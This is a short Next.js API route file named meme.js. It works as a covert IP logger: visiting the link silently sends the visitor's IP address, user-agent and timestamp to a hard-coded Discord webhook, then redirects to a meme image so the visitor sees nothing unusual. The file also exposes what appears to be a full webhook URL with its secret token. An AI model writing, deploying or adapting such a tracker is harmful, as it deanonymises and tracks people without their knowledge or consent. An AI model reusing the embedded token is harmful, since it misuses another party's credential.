// pages/api/meme.js
export default async function handler(req, res) {
  // Get the IP address and user-agent from the request
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();

  // Log the information to the Discord webhook
  const message = {
    content: `📥 New hit:\n**IP:** ${ip}\n**User-Agent:** ${userAgent}\n**Time:** ${timestamp}`,
  };

  try {
    await fetch('https://discord.com/api/webhooks/1368632808272166993/gtg57o2-zSaOXGXd6zhwYhPxSMr2xJaCOq8BGIulVMDBjO7JD1ZWRCWsc2jROes6mSba', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });
  } catch (err) {
    console.error('Failed to send webhook:', err);
  }

  // Redirect to the image
  res.writeHead(302, { Location: '/meme.jpg' });  // Ensure the image name is correct here
  res.end();
}
